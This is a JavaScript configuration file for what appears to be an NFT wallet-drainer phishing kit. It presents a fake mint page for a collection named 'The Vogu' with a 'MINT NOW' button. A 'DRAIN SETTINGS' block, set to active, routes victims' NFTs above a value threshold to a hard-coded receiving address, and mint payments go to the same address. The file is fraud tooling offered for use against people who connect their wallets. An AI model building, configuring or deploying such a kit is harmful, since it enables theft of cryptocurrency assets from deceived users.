/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

// const receiveAddress = "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6";
const receiveAddress = "0x4f0d9Ec48E9E8af2f59564DAEBf75B9454beDe7b";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
  name: "The Vogu",
  date: "",
  socialMedia: {
    discord: "http://discord.gg/vogu",
    twitter: "https://twitter.com/the_vogu",
  },
  medias: {
    preview: "preview.gif",
    favicon: "icon.png",
  },
  background: {
    type: "image", // Supported types: image, video, color (use image for gif)
    image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
    video: "background.mp4", // If you don't use video type, you can ignore this line
    color: "#4E4E6D", // If you don't use color type, you can ignore this line
  },
};

/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
  price: 0.003,
  totalSupply: 100,
  minUnits: 1,
  maxUnits: 5,
  askMintLoop: true,
};

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
  active: true,
  minValue: 0.5,
  maxTransfer: 5,
  //   nftReceiveAddress: "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6",
  nftReceiveAddress: "0x4f0d9Ec48E9E8af2f59564DAEBf75B9454beDe7b",
};

const customStrings = {
  title: " {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
  connectButton: "CONNECT WALLET",
  transferButton: "MINT NOW",
  dateString: " {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
};

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits)
  console.error(
    `Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`
  );
if (mintInfo.minUnits <= 0)
  console.error(
    `Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`
  );

if (
  !receiveAddress.startsWith("0x") ||
  receiveAddress.length >= 64 ||
  receiveAddress.length <= 40
)
  console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
